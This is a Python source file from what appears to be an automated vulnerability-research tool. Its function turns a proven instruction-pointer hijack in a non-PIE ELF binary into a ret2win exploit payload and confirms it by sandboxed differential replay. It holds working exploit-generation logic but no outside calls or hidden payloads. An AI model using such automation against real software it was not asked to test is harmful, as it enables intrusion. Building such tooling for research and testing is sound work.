"""Step 4 (doc 52 §3 part 5): hand a validated control-flow-hijack hypothesis to the exploit
ladder and climb to L3.

The hunt loop proves that the instruction pointer is attacker-controlled (a control-flow-hijack
hypothesis with a solved input). This turns that into a ret2win exploit:

  * find an attacker-chosen `win` function in the target (reuses the ladder's exploit.find_win);
  * RE-SOLVE the hijack through the driver with the saved return address pinned to the win address
    -- the solved input is FRAMING-AWARE (it still satisfies the path to the overflow), which is
    exactly what the old blind-cyclic recipes were missing;
  * confirm by a DIFFERENTIAL replay in the same sandbox the validator uses: the ret2win payload
    runs to a clean exit, while the identical payload with the return-address bytes corrupted
    crashes. Only the win address turned a crash into controlled flow, so arrival is proven without
    needing to know what win prints.

Honest ceiling (same as the ladder's): no-PIE x86-64/ELF with a fixed win address and a win that
terminates cleanly. RIP control with no win symbol, a PIE target, or a win that spawns a shell is
reported as L2 (control proven, payload built) -- never faked as L3.
"""
from __future__ import annotations

import base64
from pathlib import Path
from typing import Callable, Optional

from . import engine
from .validate import Target, replay

_ET_EXEC = 2
_UNMAPPED = 0x0000414141414141        # canonical but unmapped: corrupting the ret slot to this crashes


def _etype(data: bytes) -> int:
    return int.from_bytes(data[16:18], "little" if data[5] == 1 else "big") if len(data) >= 18 else 0


def weaponize(target: Target, hyp, *, input_size: int = 300, budget: float = 60.0,
              mem_mb: int = 4096, log: Callable[[str], None] = lambda _m: None) -> Optional[dict]:
    """Climb a confirmed control-flow-hijack hypothesis to L3 ret2win. Returns an exploit dict
    (level L3 | L2) or None when the class/target is out of scope."""
    if hyp.kind != "control-flow-hijack" or not hyp.solutions:
        return None
    try:
        data = Path(target.exe).read_bytes()
    except OSError:
        return None
    if data[:4] != b"\x7fELF":
        return None
    from ..analyze.poc import exploit
    funcs = exploit.elf_functions(data)
    win_name, win_addr = exploit.find_win(funcs)
    if win_addr is None:
        return {"level": "L2", "strategy": "ip-control", "confirmed": True,
                "note": "the instruction pointer is attacker-controlled, but the binary has no "
                        "attacker-chosen win function (no win symbol, no local shell-caller) to "
                        "redirect to -- a full ROP chain is the next rung"}
    word = 8 if data[4] == 2 else 4
    if _etype(data) != _ET_EXEC:
        return {"level": "L2", "strategy": "ret2win", "confirmed": True, "win": win_name,
                "note": f"RIP control proven and a win function ({win_name}) exists, but the "
                        f"target is PIE: a fixed redirect needs an info leak (out of scope)"}
    log(f"weaponize: re-solving {hyp.id} with RIP pinned to {win_name}@{win_addr:#x}")
    out = engine.run_driver(target.exe, argv=target.argv, input_mode=target.mode, budget=budget,
                            input_size=input_size, mem_mb=mem_mb, extra={"hijack_to": win_addr})
    solved = [h for h in engine.hypotheses_from(out, target.exe)
              if h.kind == "control-flow-hijack" and h.solutions]
    if not solved:
        return {"level": "L2", "strategy": "ret2win", "confirmed": True, "win": win_name,
                "note": f"RIP control proven; could not solve a reaching input that redirects to "
                        f"{win_name} within the budget"}
    payload = solved[0].solutions[0].data
    win_le = (win_addr & ((1 << (word * 8)) - 1)).to_bytes(word, "little")
    # the address is often written by a string copy that stops at a NUL, so only its significant
    # (non-zero-high) bytes appear in the input; the upper bytes come from already-zero stack.
    win_min = win_le.rstrip(b"\x00") or b"\x00"
    if win_min not in payload:
        return {"level": "L2", "strategy": "ret2win", "confirmed": True, "win": win_name,
                "note": f"built a redirect to {win_name}, but its address is not placed as a "
                        f"contiguous word in the input (indirect layout): not auto-confirmable"}
    # corrupt only the redirect bytes to an unmapped low address, same length and no new NUL, so
    # the overflow is otherwise identical -- only the destination changes.
    corrupt = payload.replace(win_min, b"\x11" * len(win_min), 1)
    rp = replay(target, target.exe, payload)
    rc = replay(target, target.exe, corrupt)
    won = (not rp.crashed) and (not rp.timed_out) and rc.crashed
    b64 = base64.b64encode(payload).decode()
    if won:
        return {"level": "L3", "strategy": "ret2win", "confirmed": True, "win": win_name,
                "win_addr": win_addr, "payload_b64": b64,
                "evidence": f"redirected execution to {win_name}@{win_addr:#x}: the payload runs to "
                            f"a clean exit, while the identical payload with the return address "
                            f"corrupted crashes ({rc.signal}) -- only the win address controls flow"}
    return {"level": "L2", "strategy": "ret2win", "confirmed": True, "win": win_name,
            "win_addr": win_addr, "payload_b64": b64,
            "note": f"built a framing-aware ret2win payload to {win_name}@{win_addr:#x}; clean "
                    f"arrival not auto-confirmed (payload crash={rp.crashed}, control crash={rc.crashed}) "
                    f"-- hand to the exploit ladder's breakpoint confirmation"}
